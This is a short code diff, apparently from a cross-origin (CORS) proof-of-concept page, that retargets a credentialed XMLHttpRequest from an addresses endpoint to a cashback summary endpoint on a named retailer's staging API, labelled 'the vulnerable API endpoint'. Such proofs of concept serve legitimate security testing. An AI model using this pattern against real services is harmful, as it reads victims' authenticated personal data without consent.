@@ -8,7 +8,7 @@
         function makeCorsRequest() {
             var xhttp = new XMLHttpRequest();
             // Change this URL to the vulnerable API endpoint
-            var url = "https://api.staging.my.zalora.net/v1/addresses/?addressId=3077096";
+            var url = "https://api.staging.my.zalora.net/v1/cashback/summary";
 
             xhttp.open("GET", url, true);
             xhttp.withCredentials = true; // Important for sending cookies
